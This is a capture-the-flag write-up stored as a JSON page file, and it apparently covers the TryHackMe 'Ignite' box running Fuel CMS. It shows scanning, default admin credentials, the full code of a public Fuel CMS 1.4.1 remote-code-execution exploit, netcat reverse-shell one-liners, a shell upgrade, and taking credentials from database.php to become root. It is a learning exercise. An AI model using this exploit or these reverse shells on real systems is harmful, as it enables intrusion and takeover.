@@ -1,0 +1,157 @@
+{
+    "note":"title must match route name in App.js",
+    "title":"Ignite",
+    "path":"ignite",
+    "tags":["easy","ctf", "box", "thm","web","cms","fuelcms", "apache 2.4.18","reverse shell","rce","php","cve","http 80","linux","nc","upgrade shell", "privesc"],
+    "date":"27/06/2023",
+    "location": "./writeup/",
+    "banner":"writeup/ignite/banner.gif",
+    "type":"writeup",
+    "search":[
+        {
+            "section":"Scanning",
+            "description":"Nmap scan to find port 80 HTTP open, revealing robots.txt and "
+        },
+        {
+            "section":"Web analysis (Rabbit hole pt1)",
+            "description":"Accessing Fuel CMS admin panel revealed in robots.txt and tryin to upload files"
+        },
+        {
+            "section":"RCE - Remote Code Execution",
+            "description":"Searching Fuel CMS CVE with searchsploit and found RCE - Remote Code Execution"
+        },
+        {
+            "section":"Reverse shell",
+            "description":"Upgrade to a stable shell by employing a reverse shell with Netcat"
+        },
+        {
+            "section":"Change shell",
+            "description":"Upgrade shell with python"
+        },
+        {
+            "section":"Searching for interesting files",
+            "description":"Analyzing PHP configuration files and find credentials. Privesc - privilege escalation with the credentials"
+        },
+        {
+            "section":"Privilege escalation",
+            "description":"Employed python web server to download file with powershell command in Linux environment."
+        }
+    ],
+    "body":[
+        {
+            "id":"Ignite",
+            "title":"<h1> <span style=\"color:#da1953\">Ign</span>ite</h1><hr>",
+            "body":[
+                {
+                    "id":"banner",
+                    "title":"",
+                    "body":[
+                        "<img src=\"/cyber/writeup/ignite/banner.gif\" alt=\"\"><hr>"
+                    ]
+                },
+                {
+                    "id":"Scanning",
+                    "title":"<hr><h1><span style=\"color:#da1953\">Sca</span>nning</h1>",
+                    "body":[
+                        "<br><pre>Nmap 7.91 scan initiated Thu Sep 16 15:42:21 2021 as: nmap -sC -sV -A -p- -oN nmap 10.10.238.237<br>Nmap scan report for ip-10-10-238-237.eu-west-1.compute.internal (10.10.238.237)<br>Host is up (0.014s latency).<br>Not shown: 65534 closed ports<br>PORT   STATE SERVICE VERSION<br>80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))<br>| http-robots.txt: 1 disallowed entry <br>|_/fuel/<br>|_http-server-header: Apache/2.4.18 (Ubuntu)<br>|_http-title: Welcome to FUEL CMS<br>No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).<br>TCP/IP fingerprint:<br>OS:SCAN(V=7.91%E=4%D=9/16%OT=80%CT=1%CU=35981%PV=Y%DS=2%DC=T%G=Y%TM=614357F<br>OS:5%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=108%TI=Z%CI=I%II=I%TS=A)OPS<br>OS:(O1=M505ST11NW6%O2=M505ST11NW6%O3=M505NNT11NW6%O4=M505ST11NW6%O5=M505ST1<br>OS:1NW6%O6=M505ST11)WIN(W1=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN<br>OS:(R=Y%DF=Y%T=40%W=6903%O=M505NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A<br>OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R<br>OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F<br>OS:=R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%<br>OS:T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD<br>OS:=S)</pre>",
+                        "<p>The only port open is the 80 which means it has a website. I must check it!</p>"
+                    ]
+                },
+                {
+                    "id":"Web analysis (Rabbit hole pt1)",
+                    "title":"<h1><span style=\"color:#da1953\">Web</span> analysis (Rabbit hole pt1)</h1>",
+                    "body":[
+                        "<p>Once on the web page, the only thing I see is the welcome page of a default <strong>Fuel CMS</strong> welcome page.</p>",
+                        "<p>At this point, I immediately went to check <em>robots.txt</em>. Why <em>robots.txt</em>?<br></p>",
+                        "<ol><li>Because <em>Nmap</em> tells me about this file.<img src=\"/cyber/writeup/ignite/37cad67d89754a1ebfd6c3705b710249.png\"></li><li>It is a good practice to check it you never know.</li></ol>",
+                        "<p>The file <em>robots.txt</em> show as follows:</p>",
+                        "<pre>User-agent: *<br>Disallow: /fuel/</pre>",
+                        "<p>So let me check the path. It leads to the login page of the cms.<br></p>",
+                        "<img src=\"/cyber/writeup/ignite/6599a6a905b64b6386f9fa3348d6cb6f.png\">",
+                        "<p>Since I don't have the credentials, the only thing I can think of to do is to try the default Fuel CMS credentials which turn out to be <code>admin:admin</code>.</p>",
+                        "<p>Once logged in and taking a look around I found an upload page.<br>",
+                        "<img src=\"/cyber/writeup/ignite/777da69cd431492d8df35bdc14d859ad.png\"></p>",
+                        "<p>Now, I have tried many php reverse shell pages taken from GitHub and Pentestmonkey but none of them worked and keep giving me errors.</p>",
+                        "<p><img src=\"/cyber/writeup/ignite/438cf6338e214538ab4339d52ee67b31.png\"></p>",
+                        "<p>After some research, it seems that to fix this error I have to get my hands on the php configuration file which is not possible for me at the moment.<br><a href='https://stackoverflow.com/questions/45992685/php-parse-error-syntax-error-unexpected-in-helpers-php-233'>php-parse-error-syntax-error-unexpected-in-helpers-php-233</a>.</p>",
+                        "<p>I have spent quite a lot of time at this point trying to write a better reverse shell in PHP in order to upload but I think it is a <a data-from-md title='https:/medium.com/@luke.williams1248/on-pen-testing-rabbit-holes-and-how-to-avoid-them-ed7b93cdfaa5' href='https://medium.com/@luke.williams1248on-pen-testing-rabbit-holes-and-how-to-avoid-them-ed7b93cdfaa5'>RabbitHole</a>.</p>",
+                        "<p>Then I moved on and tried another way.</p>"
+                    ]
+                },
+                {
+                    "id":"RCE - Remote Code Execution",
+                    "title":"<h1><span style=\"color:#da1953\">RCE</span> - Remote Code Execution</h1>",
+                    "body":[
+                        "<p>Now I take a step back and see what other information I have.</p>",
+                        "<p>Getting back on the main Fuel CMS page I can see the version installed, so the first thing that comes to my mind is that it might have a vulnerability and an exploit.</p>",
+                        "<p>So I search with <code>searchsploit fuel</code>.</p>",
+                        "<pre>searchsploit fuel                  <br>-------------------------------------------------------------------------------------- ---------------------------------<br> Exploit Title                                                                        |  Path<br>-------------------------------------------------------------------------------------- ---------------------------------<br>AMD Fuel Service - 'Fuel.service' Unquote Service Path                                | windows/local/49535.txt<br>Franklin Fueling TS-550 evo 2.0.0.6833 - Multiple Vulnerabilities                     | hardware/webapps/31180.txt<br>fuel CMS 1.4.1 - Remote Code Execution (1)                                            | linux/webapps/47138.py<br>Fuel CMS 1.4.1 - Remote Code Execution (2)                                            | php/webapps/49487.rb<br>Fuel CMS 1.4.7 - 'col' SQL Injection (Authenticated)                                  | php/webapps/48741.txt<br>Fuel CMS 1.4.8 - 'fuel_replace_id' SQL Injection (Authenticated)                      | php/webapps/48778.txt<br>-------------------------------------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results<br><pre>",
+                        "<p>Among all those, the one that convinces me the most is the Python RCE, called <strong>Remote Code Execution (1)</strong>.</p>",
+                        "<p>To copy it I can <code>searchsploit -m 47138</code> (without the file format <em>.py</em>)</p>",
+                        "<pre>┌──(benwick㉿benwick)-[~]<br>└─$ searchsploit -m 47138<br>  Exploit: fuel CMS 1.4.1 - Remote Code Execution (1)<br>      URL: https://www.exploit-db.com/exploits/47138<br>     Path: /usr/share/exploitdb/exploits/linux/webapps/47138.py<br>File Type: Python script, ASCII text executable<br><br>Copied to: /home/kali/47138.py<br></pre>",
+                        "<p>Now I have to set the exploit properly. By opening the code I can see that it is using a proxy in order to communicate with the remote target which I don't want so I readjust the code.</p>",
+                        "<pre class=\"python-code\"><span class=\"keyword\">import</span> requests<br><span class=\"keyword\">import</span> urllib<br><br><span class=\"variable\">url</span> = <span class=\"string\">\"http://10.10.81.104\"</span><br><span class=\"keyword\">def</span> <span class=\"function\">find_nth_overlapping</span>(<span class=\"variable\">haystack</span>, <span class=\"variable\">needle</span>, <span class=\"variable\">n</span>):<br>    <span class=\"variable\">start</span> = <span class=\"variable\">haystack</span>.find(<span class=\"variable\">needle</span>)<br>    <span class=\"keyword\">while</span> <span class=\"variable\">start</span> >= 0 <span class=\"keyword\">and</span> <span class=\"variable\">n</span> > 1:<br>        <span class=\"variable\">start</span> = <span class=\"variable\">haystack</span>.find(<span class=\"variable\">needle</span>, <span class=\"variable\">start</span>+1)<br>        <span class=\"variable\">n</span> -= 1<br>    <span class=\"keyword\">return</span> <span class=\"variable\">start</span><br><br><span class=\"keyword\">while</span> 1:<br>    xxxx = raw_input(<span class=\"string\">\"cmd:\"</span>)<br>    burp0_url = <span class=\"variable\">url</span>+<span class=\"string\">\"/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27\"</span>\\<br>+urllib.quote(<span class=\"variable\">xxxx</span>)+<span class=\"string\">\"%27%29%2b%27\"</span><br>    <span class=\"comment\">#proxy = {\"http\":\"http://127.0.0.1:8080\"}</span><br>    r = requests.get(<span class=\"variable\">burp0_url</span>)<span class=\"comment\">#, proxies=proxy)</span><br><br>    html = <span class=\"string\">\"<!DOCTYPE html>\"</span><br>    htmlcharset = r.text.find(<span class=\"variable\">html</span>)<br><br>    begin = r.text[0:20]<br>    dup = <span class=\"function\">find_nth_overlapping</span>(r.text, <span class=\"variable\">begin</span>, 2)<br><br>    <span class=\"function\">print</span> r.text[0:dup]<br></pre>",
+                        "<p>Now that I have removed part of the code and set the url to the target url I am ready to execute it in order to get RCE.</p>",
+                        "<p>NOTE: It is a Python script, at the time I wrote this writeup (17/09/2021) in every Linux distro python3 is the default Python and in most of them python2 is not even installed.<br>I had a few errors on running the script because I was executing the script with just <code>./47138.py</code> which uses python3 by default but this code seems working with python2 so I had to use <code>python2 47138.py</code> and managed to run it successfullyZ.</p>",
+                        "<pre>┌──(benwick㉿benwick)-[~]<br>└─$ python2 ./47138.py <br>cmd:<br></pre>",
+                        "<p></p>"
+
+                    ]
+                },
+                {
+                    "id":"Reverse shell",
+                    "title":"<h1><span style=\"color:#da1953\">Rev</span>erse shell</h1>",
+                    "body":[
+                        "<p>The shell I got is limiting me, and can not travel the directories. It means I need a better shell so I need a reverse shell.</p>",
+                        "<p>The first thing to do is to open a Netcat listener: <code>nc -lvnp 1234</code></p>",
+                        "<p>I used the pentestermonkey website to get the reverse shell command which is:<br><code>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.0.0.1 1234 &gt;/tmp/f</code><br>and changed the IP address with the target address.</p>",
+                        "<p>NOTE: Why did I use the previous command and not the other one on the site which is shorter and easier to understand?<br><code>nc -e /bin/sh 10.0.0.1 1234</code>. This simply didn't work, I tried both.</p>",
+                        "<p><img src=\"/cyber/writeup/ignite/70ffe32a7e9a44ba9336716b1f3b523b.png\"></p>"
+                    ]
+                },
+                {
+                    "id":"User flag",
+                    "title":"<h1><span style=\"color:#da1953\">Use</span>r flag</h1>",
+                    "body":[
+                        "<p>Now I can freely navigate and get the flag from the user folder.<br><img src=\"/cyber/writeup/ignite/622d46e05de64b6cbd50c59b191e9825.png\"></p>"
+                    ]
+                },
+                {
+                    "id":"Rabbit hole pt2 - LinPEAS",
+                    "title":"<h1><span style=\"color:#da1953\">Rab</span>bit hole pt2 - LinPEAS</h1>",
+                    "body":[
+                        "<p>As <a href=\"https://www.linkedin.com/in/ippsec/\"  target=\"blank\" rel=\"noopener noreferrer\">IPPSec</a> teaches one, the best way to enumerate a machine is through linpeas (winpeas). Once downloaded and run (no details about these steps because it failed) it gave a huge report that leads nowhere.</p>"
+                    ]
+                },
+                {
+                    "id":"Searching for interesting files",
+                    "title":"<h1><span style=\"color:#da1953\">Sea</span>rching for interesting files</h1>",
+                    "body":[  
+                        "<p>At this point, I started looking at the files in the <strong>/var/www/html/fuel</strong> folder.</p>",
+                        "<p>Why in particular this folder? No particular reason this is the folder from where I started and need to check the whole box so eventually I will check this. I am lucky because the solution for the next step is here.</p>",
+                        "<p>By navigating inside the folder at a certain point I reached the file <strong>/var/www/html/fuel/application/config/database.php</strong> which contains the password for the administrator account.</p>",
+                        "<p>To view the file I can just <code>cat database.php</code></p>",
+                        "<p><img src=\"/cyber/writeup/ignite/815d893c60c049aa83450ce0bca3e3da.png\"></p>"
+                    ]
+                },
+                {
+                    "id":"Change shell",
+                    "title":"<h1><span style=\"color:#da1953\">Cha</span>nge shell</h1>",
+                    "body":[  
+                        "<p>Sometimes happens that simpli using the <code>cat</code> command doesn't work and it says: <i>Command : must be run from a terminal</i>. In order to have a better shell I can run the following command:<code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code></p>",
+                        "<p><img src=\"/cyber/writeup/ignite/0364d820431744c1a5604b168e6c7eac.png\"></p>"
+                    ] 
+                },
+                {
+                    "id":"Root flag",
+                    "title":"<h1><span style=\"color:#da1953\">Roo</span>t flag</h1>",
+                    "body":[ 
+                        "<p>Finally, to get the root flag I have to elevate the privilege. While I have the username and the password I can simply switch the user <code>su root</code> and enter the password to become root and read the root flag.</p>",
+                        "<p><img src=\"/cyber/writeup/ignite/1a5ee7c350e04dfb873ad7f82f23537e.png\"></p>"
+                    ]
+
+                }
+            ]
+        }
+    ]
+}
